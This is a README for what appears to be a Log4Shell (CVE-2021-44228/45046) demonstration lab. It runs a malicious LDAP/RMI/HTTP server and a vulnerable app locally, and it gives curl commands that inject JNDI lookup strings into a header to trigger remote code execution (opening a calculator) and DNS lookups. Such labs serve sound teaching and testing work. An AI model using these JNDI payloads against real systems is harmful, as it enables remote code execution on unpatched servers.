# Log4j CVE-2021-44228 and CVE-2021-45046

## Requisites

Use a vulnerable JDK, for instance [JDK 1.8.0_181](https://www.oracle.com/es/java/technologies/javase/javase8-archive-downloads.html)

## Usage

### Malicious server

The malicious server deploys the following endpoints:
* **1389** LDAP server
* **1099** RMI server
* **8081** HTTP server 

````shell
./gradlew :malicious-server:bootRun
````

### Vulnerable application

The vulnerable application deploys one HTTP endpoint at **8082**
````shell
./gradlew :vulnerable-app:bootRun
````

## Remote Code Execution

Choose a payload that will be executed by the vulnerable app and encode it in Base64. As an example, in order to open the 
calculator in Windows: ```calc.exe```

### LDAP

````shell
curl --header "X-Vulnerable-Header: ${jndi:ldap://localhost:1389/payload/Log4j/Y2FsYy5leGU=}" http://127.0.0.1:8082/
````

### RMI

````shell
curl --header "X-Vulnerable-Header: ${jndi:rmi://localhost:1099/payload/Log4j/Y2FsYy5leGU=}" http://127.0.0.1:8082/
````

## DNS queries

````shell
curl --header "X-Vulnerable-Header: ${jndi:dns://8.8.8.8/google.es}" http://127.0.0.1:8082/
````
